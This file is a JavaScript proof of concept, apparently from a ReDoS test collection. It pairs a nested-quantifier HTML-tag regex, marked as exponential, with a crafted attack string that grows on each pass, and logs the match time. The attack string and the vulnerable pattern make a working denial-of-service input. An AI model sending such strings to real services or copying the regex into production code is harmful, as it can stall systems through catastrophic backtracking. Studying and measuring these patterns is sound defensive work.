/* 225
 * (<[^>]*?tag[^>]*?(?:identify_by)[^>]*>)((?:.*?(?:<[ \r\t]*tag[^>]*>?.*?(?:<.*?/.*?tag.*?>)?)*)*)(<[^>]*?/[^>]*?tag[^>]*?>)
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"<tagidentify_by>"+"<tag</!tag</>"*2+"! _1_EOA(i or ii)"
 */
var REGEX = new RegExp("(<[^>]*?tag[^>]*?(?:identify_by)[^>]*>)((?:.*?(?:<[ \r\t]*tag[^>]*>?.*?(?:<.*?/.*?tag.*?>)?)*)*)(<[^>]*?/[^>]*?tag[^>]*?>)")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '<tagidentify_by>' + '<tag</!tag</>'.repeat(i*1) + '! _1_EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}